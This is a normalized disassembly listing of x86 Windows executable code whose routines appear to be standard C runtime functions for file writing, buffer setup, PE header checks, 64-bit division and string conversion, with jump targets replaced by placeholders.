call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40f290
pop ecx
sub_40d964
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_40b01d
push eax
call sub_40f47f
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_40a128
add eax 0x20
cmp esi eax
jne r-xdata
call sub_40a128
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_40ecc4
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_40da00
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_4065cc
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_40da34
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_40778e
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_40778e
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_4114f7
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_407713
mov [ esi ] eax
add esi 0x4
push esi
call sub_407713
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40ed55
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_40ed55
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_407713
pop ecx
mov [ rw-data ] eax
sub_40daf0
push esi
push 0x4
push 0x20
call sub_40ed09
mov esi eax
push esi
call sub_407713
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_40db1f
push 0xc
push r--data
call sub_4099f4
call sub_406330
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40da34
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40db55
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
sub_40db72
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_407713
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40dba0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40dbe0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40dc30
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_409a50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_40dba0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_40dbe0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40dd55
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_40dd99
push 0x20
push r--data
call sub_4099f4
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_407961
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_409a39
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40dd55
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40654a
mov [ ebp - 0x1c ] 0x1
push eax
call sub_40778e
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_407f64
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_407efc
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_408efb
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_407785
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40df0d
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40df76
push 0x10
push r--data
call sub_4099f4
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_409a39
retn
sub_40dfd6
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_411780
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_407f77
mov [ eax ] esi
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4061c0
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_407f77
xor esi esi
mov [ eax ] esi
call sub_407f64
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_407efc
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40f47f
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40f298
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_4079da
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_407f64
mov [ eax ] 0x1c
call sub_407f77
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_407f8a
pop ecx
jmp r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40b58c
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_4116ba
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_411472
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_411472
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_4116ba
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_40e709
push 0x10
push r--data
call sub_4099f4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_407f77
and [ eax ] 0x0
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
call sub_407f64
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_407efc
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_409a39
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_410949
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f77
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40dfd6
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e7db
mov eax [ ebp - 0x1c ]
sub_40e7e5
push 0x10
push r--data
call sub_4099f4
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_407f64
mov [ eax ] 0x9
call sub_407f64
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_407efc
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_409a39
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_410949
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_407f64
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_4108d2
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e8bc
mov eax [ ebp - 0x1c ]
call sub_407f77
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_40e8d0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_40e980
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_40ea40
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_40eac8
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_410d4f
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
